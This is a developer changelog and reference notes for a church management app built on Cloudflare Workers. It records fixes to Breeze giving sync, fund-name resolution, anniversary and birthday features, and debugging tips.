- **v83**: EM2 — Automated birthday/anniversary emails via Resend. New `src/api-emails.js`: `sendBirthdayEmails` and `sendAnniversaryEmails` functions. Birthday: queries active members with today's dob MM-DD, sends personal email via Resend. Anniversary: pairs couples by household, sends one combined email for shared email addresses, separate emails otherwise; excludes deceased spouses. Both use `RESEND_API_KEY` + `EMAIL_FROM` already in worker. Daily cron added to wrangler.toml (`0 14 * * *` = 9am Central); `scheduled` handler added to `tlc-volunteer-worker.js`. Dedup via audit_log (`birthday_email_sent`/`anniversary_email_sent` actions). Admin test buttons in Settings tab. Manual trigger endpoints: `POST /admin/api/email/run-birthday` and `/run-anniversary` (admin only).
- **v82**: PL1 — Members-first people list. Default view shows Members only (`peopleFilter.mt` initializes to `'member'`). "Members" toggle button in toolbar highlights teal when active; clicking it calls `toggleMemberFilter()` to switch between `mt='member'` and `mt=''`. A "Member" filter chip appears below the toolbar with an × to clear. `renderActiveFilterChips()` and `updateFilterBadge()` now called after every `loadPeople` response so chip/button state is correct on initial tab load.
- **v81**: PL2 — Archive/Deceased person handling. New `status` column (`active|archived|deceased`) added to `people` table via DB migration; `active` field kept in sync. People list default view hides archived/deceased; "Archived" toggle button in toolbar switches to archived view with highlighted button and status pills on rows. Dashboard birthday/anniversary queries filter out archived/deceased. Three new API endpoints: `POST /people/:id/archive` (set status=archived, active=0), `POST /people/:id/unarchive` (set status=active, active=1, deceased=0), `POST /people/:id/deceased` (set status=deceased, deceased=1, death_date=today, active=0; promotes household head if deceased was head). Person profile shows Archive/Deceased buttons for active people; Reactivate button for archived/deceased; status badge next to member type. Anniversary cards exclude couples where either spouse is deceased via status OR deceased column check.
- **v80**: Extend drag-to-resize to all charts: (1) Main att chart YoY mode now respects `_attChartH` (passes it to `renderYoYChart`). (2) Attendance report YoY chart, (3) Attendance by Service chart, and (4) Giving Trend chart each get their own height var (`_yoyRptH`, `_byServiceRptH`, `_givingTrendH`) and a drag handle. Report charts re-render only the SVG portion on drag, preserving the table below. Added `_chartResizeHandle()` helper for consistent handle HTML. Added `_rptResizeMoveH` generic handler keyed by chart type.
- **v79**: Four UI improvements: (1) AT3 — Drag-to-resize attendance chart: added a drag handle below the attendance chart card; dragging adjusts `_attChartH` (120–600px range) and re-renders at the new height using `requestAnimationFrame`. (2) PH2 — Profile photo crop tool: selecting a photo now opens a crop modal with a canvas overlay; user can drag the crop box to reposition or drag corners to resize; "Crop & Upload" applies the crop before uploading; "Use Full Image" skips crop. (3) DB6 — Dashboard card customization: added a "⚙ Customize" button on the dashboard header that opens a modal with checkboxes to show/hide Follow-up Queue, First-Time Givers, Not Seen Recently, Birthdays, Anniversaries, and Membership by Type; preferences saved to localStorage. (4) AT4 — Year-over-year giving chart: new "Giving Trend" tile on the Reports tab; user selects which years to compare (defaults to last 3); calls new `/admin/api/reports/giving-trend` endpoint; renders a monthly line chart with per-year totals in the legend.

### 2026-04-19
- **v78**: Remove dangerous migration pass from v77 ghost fund redirect. The v77 pass did `UPDATE giving_entries SET fund_id=<general_fund_id> WHERE fund_id=<ghostLocalId>` — if fund 1771128 was previously linked by name to any real fund (not just a "Breeze Fund XXXXX" placeholder), this would move ALL of that fund's entries to General Fund, inflating totals. Fixed: keep the `fundByBreezeId` redirect for new imports only; existing entries with ghost fund must be corrected manually via Edit Gift modal.
- **v77**: Ghost fund redirect — hardcode Breeze fund 1771128 (deleted/retired) → General Fund (1718214). On sync: (1) any new contributions with the ghost fund ID now land in General Fund, (2) a migration pass updates existing DB entries pointing to the ghost fund's local record so they immediately display the correct fund name. G13 partially resolved: fund fixed, but if Breeze creates new payment IDs for the edited contributions, duplicates by person+date may exist and require manual cleanup via Edit Gift modal.
- **v76**: Three giving sync improvements: (1) Fetch `contribution_updated` from Breeze audit log and apply corrections to already-imported entries — uses giving/list current amounts as source of truth, scales multi-fund splits proportionally. (2) For new imports, override stale audit-log amounts with giving/list current data when a `glByPaymentId` match exists. (3) Full Breeze audit log CSV export via `GET /admin/api/giving/breeze-audit-export` with "Download Audit Log CSV" button in Settings; exports all action types with person names, both IDs, current amounts, and fund details. `correctedCount` added to diagnostics and sync result message.
- **v75**: Fix giving/list truncation — scope to sync window instead of all-time. The all-time range (2020-today, limit=10000) silently dropped early-year entries for churches with 15,000+ all-time contributions. Switching to sync window (lateStart–end) keeps the result under ~3,000 entries per year, well within the limit. This was causing ~100 contributions from early 2025 to be missing from the supplement.
- **v74**: Supplement audit log with giving/list entries for Tithely batch imports. Tithely contributions don't appear in any audit log action type — they're only in `/api/giving/list`. Now after processing audit log entries, giving/list entries with payment IDs not already seen are normalized into synthetic audit-log-format entries and processed identically. `givingListSupplementCount` diagnostic shows how many were added.
- **v73**: Fix batch grouping for older-format audit log entries. Some 2025 entries use `batch_edit_select` (internal Breeze batch record ID) instead of `batch_num`. These were falling back to date-based batch names ("Breeze Import YYYY-MM-DD") instead of being grouped into a single numbered batch. Now uses `batch_num || batch_edit_select` so all entries from the same Breeze batch are grouped together.
- **v72**: Also fetch `bulk_import_contributions` action from audit log in parallel with `contribution_added`. Tithely (external processor) batch imports land under this action type, not `contribution_added`, explaining why ~700 2025 contributions were missing from audit-log syncs. Entries are merged and deduplicated by payment ID before processing. Adds `contributionAddedCount`, `bulkImportCount`, and `bulkImportSample` to diagnostics so the structure of bulk entries can be verified.
- **v71**: G9 fix — import cross-year late entries (45-day grace window). Contributions whose contribution date falls within 45 days before the sync `start` are now imported with their actual contribution date instead of being skipped. Fixes Dec 2025 contributions logged in Jan 2026 that were previously never imported into either year. `seenIds` guard prevents double-import if both years are synced. Also bumps audit log limit from 3000 → 10000 to prevent silent truncation for high-volume years. New response field: `lateImported` (count of grace-window entries added). `lateEntries` diagnostic now only shows truly excluded entries (older than 45 days before start).
- **v70**: Fix merged/deleted Breeze fund IDs still showing as "Breeze Fund XXXXX". Root cause: `breezeFundNames` is only populated from Breeze API endpoints, which no longer return merged funds. Fix: scan all audit log entries for `fname-{uuid}` fields (recorded at log time, survives merges) and use those as a fallback source for `breezeFundNames` before the batch-rename block runs.
- **v69**: Code review improvements: add numeric guard on fund IDs before URL interpolation; replace silent catch{} with `diag.lateFundFetchWarnings` logging; update DEPLOY_VERSION date.

### 2026-04-18
- **v69**: Resolve fund names for late-entry fund IDs. Funds that appear only in date-filtered (late) entries were never reaching the individual API lookup, so they displayed as raw Breeze IDs in the lateEntries diagnostic. Now adds a targeted resolution pass for those IDs before Pass 2. Also fixes giving-list fallback fund lookup to prefer `fund_id` over row `id`.
- **v68**: Fix giving list harvest returning empty. Breeze requires date params — without them it returns []. Now uses fixed wide range (2020-01-01 to today) so all-time fund names are captured regardless of sync window.
- **v67**: Sync diagnostics now show `lateEntries` (contributions outside the sync date range, with date/amount/fund/method per entry) and `ghostFundContribs` (all DB contributions tied to still-unresolved "Breeze Fund XXXXX" funds). Both appear at the top of the diagnostics block after a sync.
- **v65**: Fix batch-rename of placeholder funds running before giving/list harvest. The rename block checked `breezeFundNames` before the giving list had been fetched, so it always had 0 names (since /api/funds returns empty for this account). Moved batch-rename to after the giving list harvest so the full name map is available.
- **v64**: Separate "already existed" from "outside date range" in sync status. The audit log filters by LOG DATE, so Dec contributions entered in Jan appear in the Jan sync window but have prior-year contribution dates. These were counted as "already existed" — now shown as "outside date range (logged late)" so a clean sync after deleting data shows 0 already-existed instead of a confusing number.
- **v63**: Harvest fund names from all-time giving list (no date filter) instead of current sync window only. Ensures fund IDs that appear rarely or only in older contributions are still resolved, preventing isolated "Breeze Fund XXXXXXX" stragglers.
- **v62**: Fix root cause of "Breeze Fund XXXXXXX" placeholder fund names. The giving list harvest used `f.id` (a 9-digit per-payment row ID unique to each giving-list row) as the key in `breezeFundNames`, instead of `f.fund_id` (the 7-digit actual Breeze fund ID that the audit log uses in `fund-` fields). Swapping to `f.fund_id || f.id` means the harvest now builds `breezeFundNames['1718214'] = '40085 General Fund'`, which matches what the audit log reads. On next sync the batch-rename block will update all existing "Breeze Fund XXXXXXX" records to their real names.
- **v61**: Show sync diagnostics in UI. After "Sync Date Range" completes, full JSON diagnostics object renders in a scrollable pre block directly below the status message. Also improved the status line to report dupes removed, funds renamed, and funds created.
- **v60**: Add comprehensive diagnostics to Breeze giving sync response. `diagnostics` object now includes: (1) `apiFundsSample` — what `/api/funds` returned after bulk fetch; (2) `givingListSample` — raw structure of first 3 giving/list entries (shows keys, fund/funds fields); (3) `auditLogSample` — parsed details of first 3 audit log entries, showing all fund-*, fname-*, amount-* fields; (4) `breezeFundNamesAfterHarvest` — complete map of all fund IDs+names gathered from both sources; (5) `unresolvedFundIds` — fund IDs that would become "Breeze Fund XXXXX" placeholders. Purpose: diagnose why fund names aren't resolving and which ID system the audit log uses.

### 2026-04-17
- **v53**: Fix Breeze giving sync hitting Cloudflare D1 per-invocation limit. Root cause: per-entry sequential D1 awaits inside the processing loop (one UPDATE per entry for batch-date correction, one per fund for linking). Replaced with a two-pass approach: Pass 1 pre-scans all entries to collect needed batches/funds; all creates/updates are then executed via db.batch() (each batch = 1 D1 call). Pass 2 builds entry inserts with no D1 calls in the loop. Total D1 calls reduced from O(entries) to ~10 regardless of sync size. Also added "Clear Giving by Year" danger-zone button + API endpoint so a single year can be wiped without touching others.
- **v52**: Fix cross-chunk split-payment imports. Increased CSV chunk size from 500 → 5000 rows so an entire year of giving data is processed in one API call; nth-occurrence tracking (v51) now reliably handles all split-fund rows. Added "Look Up Payment ID" card in Settings import section (GET /admin/api/giving/by-payment-id) to see which fund/amount was recorded for any Breeze payment ID.
- **v51**: Fix giving CSV import for multi-row split payments. Breeze exports one row per fund for split donations (same Payment ID, different fund/amount). Previously the second row was treated as a duplicate and the fund was silently dropped. Now tracks nth-occurrence of each payment ID within a chunk; assigns entry IDs pid (1st), pid-2 (2nd), pid-3 (3rd), etc. Duplicate check uses pid-N for subsequent occurrences. Also returns dupIds list in response; frontend shows expandable list of skipped payment IDs after import completes.
- **v50**: Fix anniversary pairing when spouse is a visitor/non-member. Secondary household lookup no longer filters by member_type — the qualifying person already passed that check; their partner is pulled in regardless of member type. Common pattern: one spouse is a member, the other is a visitor.
- **v49**: Fix anniversary pairing for spouses without head/spouse family_role. Secondary household lookup (for solo entries) previously only found partners with `family_role IN ('head','spouse')`; broadened to any active non-deceased household member with a relevant member type, preferring head/spouse roles but falling back to any match. Fixes Todd & Jessica Shasserre showing solo.
- **v48**: Giving by Fund report groups funds by numeric code prefix. Funds sharing the same code (e.g. "40085 General Fund", "40085 Christmas Offering", "40085 Lenten") are collapsed under a gray group header row with an indented list and a subtotal line. Funds with a unique code or no code show as flat rows. No API change — grouping is client-side.
- **v47**: Giving CSV import — three correctness fixes: (1) Negative entries (refunds/adjustments) were silently dropped by `cents <= 0` check; changed to `cents === 0` so negative adjustments are now imported. (2) Fund name "nan" (blank fund exported by Excel/Python) now maps to General Fund instead of creating a junk fund record. (3) Person IDs with trailing `.0` float suffix (e.g. `43826663.0`) now normalized by stripping `.0` so giving entries link correctly to people.
- **v46**: AT1, AT2, PF1, PH1, HQ4 — (AT1) Attendance table collapse/expand toggle button above the Sunday list. (AT2) Fix attendance-by-service chart direction: ORDER BY ASC so January plots left, December plots right. (PF1) Filter people by missing data fields: multi-select checkboxes organized by category (Main/Family/Other/Contact) in filter drawer; AND logic finds people missing all selected fields; chips shown for each active missing-field filter. (PH1) Household photo upload: replace plain URL field with upload button + preview in hh-modal; POST /admin/api/households/:id/photo → R2 → DB. (HQ4) Household head robustness: GET /admin/api/households/no-head-count and POST /admin/api/households/fix-heads promote spouse or first member to head for headless households; Settings card shows count and fix button.
- **v45**: PH3 — Fix black bar above household card photos. Wrapped img in a container div with matching background-color and border-radius; onerror now hides the whole container so the 80px slot disappears entirely on load failure instead of showing a dark broken-image rectangle.
- **v44**: Anniversary propagation on manual person save — when anniversary_date is set on a head/spouse, automatically copies it to their household partner if the partner has none. Covers manually-added people who never sync to Breeze.
- **v43**: Anniversary improvements — (1) Breeze import now propagates anniversary_date to spouse when only one has it set; (2) anniversary dashboard card hides entries where either spouse is deceased.
- **v42**: DB7 — Fix anniversary spouse pairing for couples where only one person has the anniversary_date set in Breeze (the other's field is blank). After the initial grouping pass, a secondary household lookup finds the head/spouse partner and adds them to the entry. Covers the common Breeze pattern where only the household head has the date.
- **v41**: Add "Clear All Funds" button in Settings danger zone. Deletes all fund records (not giving entries) so garbage fund names from bad imports can be wiped before re-importing. API: DELETE /admin/api/funds/all (admin only).
- **v40**: Keep Breeze fund number prefix in fund names. The v36 parseFundSplits change stripped "40085" from "40085 General Fund" — user wants the full name including the number. Regex now strips only the trailing amount in parens, leaving the rest of the name intact.
- **v39**: Fix "Internal server error" on Breeze sync. Root cause: `import/breeze-giving`, `import/breeze-sync-person`, and `import/breeze-giving-csv` had no outer try/catch — any uncaught exception escaped to the api-admin.js outer catch and returned the generic "Internal server error" message instead of a descriptive one. Added try/catch to all three. Also fixed the export endpoints being unreachable (404): added `seg.startsWith('export/')` to the ChMS dispatch condition in api-admin.js.
- **v38**: G5 — Export Data. Three CSV download buttons in Settings → Data Import & Sync: Export All People (name, contact, dates, household, member type), Export Giving (year selector, all entries with date/person/fund/amount/method), Export Register (all baptism/confirmation/wedding records). API: GET /admin/api/export/{people,giving,register}; people/register = admin-only, giving = finance+.
- **v37**: G4 — Fix reopen/close batch buttons. Previously both did an extra GET pre-fetch; if that fetch silently failed, `batch_date`/`description` were undefined and dropped by JSON.stringify (data corruption), and errors were invisible making the button look dead. Now uses `_currentBatch` (stored on render) directly — no extra round-trip — and adds `.catch()` with alert so failures surface instead of disappearing.
- **v36**: Fix giving CSV import — `split(/\\r?\\n/)` in String.raw was emitting literal `\\r?\\n` to the browser, so the file never split into lines and 0 rows were processed. Fixed to `split(/\r?\n/)`. Also fixed `parseFundSplits` to strip Breeze's numeric fund ID prefix (`40085 General Fund` → `General Fund`) so imported gifts match existing fund records by name.
- **v28**: G1 full fix — added `POST /admin/api/import/fix-fund-names` standalone endpoint + "Auto-Fix Fund Names from Breeze" button in Settings. Handles `{funds:[...]}` response format from Breeze in addition to plain array. CSV import now also renames existing placeholder funds when it sees the real name from the CSV data, and shares `fundByName` cache with `fundByBreezeId` for de-dup. Response now includes `breezeFundsFound` for diagnostics.
- **G1 fix**: Breeze giving import now pre-fetches `/api/funds` at the start of every sync to build a real fund-name map. Fixes "Breeze Fund XXXXX" placeholders appearing as fund names. Also retroactively renames any already-corrupted placeholder funds on the next sync. Response now includes `fundsRenamed` count. (api-chms.js only — no frontend change)
- **v27**: G2 — person profile giving tab: added Batch column (clickable → navigates to that batch in the Giving tab), gift rows are now clickable (opens edit-gift-modal instead of inline editing), edit modal title shows batch # and hides Save button for closed batches. DB5 — last worship stat card now shows both services + combined total on a single card instead of two separate cards.
- **v26**: H1 — Organizations tab added (sidebar between Households and Giving; new `organizations` DB table; full CRUD API + UI with card grid, search, pagination, add/edit modal). H3 — Household giving summary added to household detail modal (finance+ only; shows last 5 years of giving totals for all household members).

### 2026-04-16
- **v23**: HQ4 fix — COALESCE fallback in all 3 disambiguation paths so households without a 'head' role still get disambiguated. DB4 — birthday and anniversary split into two separate dashboard cards; anniversary couples (same household + same date) paired into one line ("Bob & Alice Johnson"); bulletin copy format: "Apr  5  John Smith" with year in header.
- **v22**: HQ4 — household name disambiguation. `disambiguateHHName()` helper in API; households list query now fetches `head_first_name` + a global dup-name check computes `display_name` per row. Same for `households/:id` and `people` (list + single record adds `household_display_name`). Frontend uses disambiguated name in household cards, detail modal, people table, person profile badge, and both household autocompletes. Pattern: "Smith Family" → "John Smith Family".
- **v21**: HQ3 — "Household" sort column added to people list (API + clickable header). HQ1 — sync-address endpoint now only updates members with no existing address (never overwrites); returns updated count. "Push address to members without one" button added to household edit modal and updated on person profiles.
- **v11**: Register edit form — DOB, Place of Birth, Baptism Place fields added (Goal 2). Autofill `name=` attributes added to all form fields missing them (~50 fields across all modals, Goal 3). Per-person Breeze sync now updates photo_url + exposes photo diagnostic (Goal 4).
- **v8**: Fixed blank-status people defaulting to Member (R10).
- **v7**: Fixed tag sync Worker timeout — batch DB ops (R12).
- **v6**: Fixed deactivation wipe bug (R11); removed tag sync from import (R13); added Restore All Active button.
- **v5**: Fixed member_type over-count from built-in Breeze type field (R9).
- **v4**: Fixed directory member filter (D1); fixed label accessibility errors (74 resources).
- **Phase 4 complete**: D1 member filter, D2 per-field privacy, D3 print layout (v4).
- **Phase 3 complete**: P3 inline gift editing and P4 Breeze-style section-level inline editing shipped (v3).
- **Phase 2 complete**: H2 add-to-household with create-new-person option; P1 pagination already done.
- **NOTES.md updated**: Marked phases 2, 3 & 4 done; resolved issues R9–R13 documented.

### 2026-04-15
- **NOTES.md created**: Added this dev reference file; backlog populated from admin-provided list.
- **Bulk import global try/catch** (`src/api-chms.js`): Wrapped entire `import/breeze` handler in try/catch so uncaught exceptions return `{ ok: false, error: "..." }` JSON instead of Cloudflare HTML error page.
- **Deactivation query batching**: Changed `NOT IN (?)` deactivation to process IDs in chunks of 90 to respect D1's ~100-parameter limit.
- **Per-person Breeze sync**: Added `POST /admin/api/import/breeze-sync-person` endpoint and "Sync Breeze" button on the profile demographics section.
- **Demographic field detection**: Fixed `field_id` vs `id` lookup, added literal key fallbacks, improved `findField` date-preference logic, updated `extractDate` to check `birth_date`/`birthday` keys.

---

## Useful Debug Patterns

### Check what Breeze fields are being matched
On the first batch of a bulk import, the response includes `_diag` with:
- `dob_field`, `baptism_field`, `confirmation_field` — which Breeze fields were matched
- `sample_detail_keys` — first 20 keys from first person's `details` object
- `all_profile_fields` — full list of field names/IDs from `/api/profile`

### Per-person sync diagnostic
`POST /admin/api/import/breeze-sync-person` returns `{ diag: { all_profile_field_names, detail_keys_in_breeze, detail_sample, field_matches, fetch_debug } }` — check browser console after clicking "Sync Breeze".

### Cloudflare Worker returning HTML instead of JSON
Means an uncaught exception escaped the handler. Check:
1. Is there a try/catch around the relevant endpoint block?
2. Are there any `await` calls outside try/catch that could throw?
3. D1 parameter limit (~100 per statement) — use chunked queries for large IN/NOT IN lists.

---

## Environment Variables (Cloudflare Worker secrets)
- `BREEZE_SUBDOMAIN` — subdomain for `<subdomain>.breezechms.com`
- `BREEZE_API_KEY` — Breeze API key
- `DB` — D1 database binding
